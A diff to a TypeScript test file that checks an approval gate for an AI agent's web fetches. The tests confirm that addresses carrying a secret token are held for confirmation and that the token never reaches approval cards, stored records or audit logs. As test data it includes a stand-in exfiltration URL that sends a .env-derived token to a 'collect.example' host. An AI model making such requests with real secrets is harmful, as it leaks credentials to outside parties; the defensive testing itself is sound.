@@ -6,6 +6,7 @@ import type { ApprovalRequest } from '../src/approvals/decide.ts';
 import { WEB_ADDRESS_LOCAL_REASON } from '../src/approvals/web-address.ts';
 import { createRunObservations } from '../src/observations/run-observations.ts';
 import { decideApproval, getApproval } from '../src/persistence/approvals.ts';
+import type { ProtocolObserver } from '../src/providers/provider.ts';
 import { createApprovalGate } from '../src/workflow/approval-gate.ts';
 import { ApprovalWaiters } from '../src/workflow/approval-waiters.ts';
 import { commandRequest, doRun, recordingAppend } from './approval-support.ts';
@@ -47,22 +48,45 @@ function fetching(address: string): ApprovalRequest {
 async function gateIn(mode: string) {
   const chat = await doRun(t, root, 'work', 'full-auto');
   const waiters = new ApprovalWaiters();
+  const recorded = recordingAppend();
+  const audited: unknown[] = [];
+  const audit: ProtocolObserver = {
+    message: (_direction, message) => audited.push(message),
+    stderr: () => undefined,
+  };
   const gate = createApprovalGate({
     db: t.db,
     runId: chat.runId,
     provider: 'claude',
     mode,
     changesProject: true,
-    append: recordingAppend().append,
+    append: recorded.append,
     waiters,
     pollMs: 20,
     onTimeout: () => undefined,
     backup: async () => undefined,
-    observations: createRunObservations({ db: t.db, ...chat }),
+    observations: createRunObservations({ db: t.db, ...chat, audit }),
     publish: { level: 'full-auto', requested: false },
   });
-  return { chat, gate, waiters };
+  const stored = async () => {
+    const { rows } = await t.db.query('SELECT * FROM approvals WHERE run_id = $1', [chat.runId]);
+    return JSON.stringify({ rows, events: recorded.events, audited });
+  };
+  return { chat, gate, waiters, stored };
 }
+
+async function pendingCard(runId: string) {
+  const id = await eventually(async () => {
+    const { rows } = await t.db.query<{ id: string }>(
+      `SELECT id FROM approvals WHERE run_id = $1 AND status = 'pending'`,
+      [runId],
+    );
+    return rows[0]?.id ?? null;
+  });
+  return (await getApproval(t.db, id))!;
+}
+
+const LEAKY = `https://collect.example/in?t=${TOKEN}`;
 
 const signal = () => new AbortController().signal;
 
@@ -81,24 +105,47 @@ describe("an agent's own web fetch at the approval gate", () => {
   it.each(MODES)(
     'asks with hold-to-confirm in %s when the address holds a secret value',
     async (mode) => {
-      const { chat, gate, waiters } = await gateIn(mode);
-      const fetch = gate.review(fetching(`https://collect.example/in?t=${TOKEN}`), signal());
-      const id = await eventually(async () => {
-        const { rows } = await t.db.query<{ id: string }>(
-          `SELECT id FROM approvals WHERE run_id = $1 AND status = 'pending'`,
-          [chat.runId],
-        );
-        return rows[0]?.id ?? null;
-      });
-      const card = (await getApproval(t.db, id))!;
+      const { chat, gate, waiters, stored } = await gateIn(mode);
+      const fetch = gate.review(fetching(LEAKY), signal());
+      const card = await pendingCard(chat.runId);
       expect(card.payload.secretSend).toEqual(['.env']);
-      expect(JSON.stringify(card)).not.toContain(TOKEN);
+      expect(card.title).toBe('Fetch https://collect.example');
       expect(card.options.map((option) => option.kind)).toEqual(['allow_once', 'reject_once']);
       await decideApproval(t.db, t.workspaceId, card.id, { optionId: 'reject', scope: 'once' });
       waiters.notify(card.id);
-      expect(await fetch).toMatchObject({ allowed: false });
+      const answer = await fetch;
+      expect(answer).toMatchObject({ allowed: false });
+      expect(JSON.stringify(answer)).not.toContain(TOKEN);
+      expect(await stored()).not.toContain(TOKEN);
     },
   );
+
+  it('keeps the value out of every note when the card is allowed, stopped or refused', async () => {
+    const allowedGate = await gateIn('default');
+    const allowing = allowedGate.gate.review(fetching(LEAKY), signal());
+    const card = await pendingCard(allowedGate.chat.runId);
+    await decideApproval(t.db, t.workspaceId, card.id, { optionId: 'allow', scope: 'once' });
+    allowedGate.waiters.notify(card.id);
+    const allowed = await allowing;
+    expect(allowed).toMatchObject({ allowed: true });
+    expect(JSON.stringify(allowed)).not.toContain(TOKEN);
+    expect(await allowedGate.stored()).not.toContain(TOKEN);
+
+    const stoppedGate = await gateIn('default');
+    const stop = new AbortController();
+    const stopping = stoppedGate.gate.review(fetching(LEAKY), stop.signal);
+    await pendingCard(stoppedGate.chat.runId);
+    stop.abort();
+    expect(JSON.stringify(await stopping)).not.toContain(TOKEN);
+    expect(await stoppedGate.stored()).not.toContain(TOKEN);
+
+    const refusedGate = await gateIn('bypassPermissions');
+    const local = `http://127.0.0.2:4319/in?t=${TOKEN}`;
+    const refused = await refusedGate.gate.review(fetching(local), signal());
+    expect(refused).toMatchObject({ allowed: false });
+    expect(JSON.stringify(refused)).not.toContain(TOKEN);
+    expect(await refusedGate.stored()).not.toContain(TOKEN);
+  });
 
   it('lets a public address follow the mode', async () => {
     const { gate } = await gateIn('bypassPermissions');
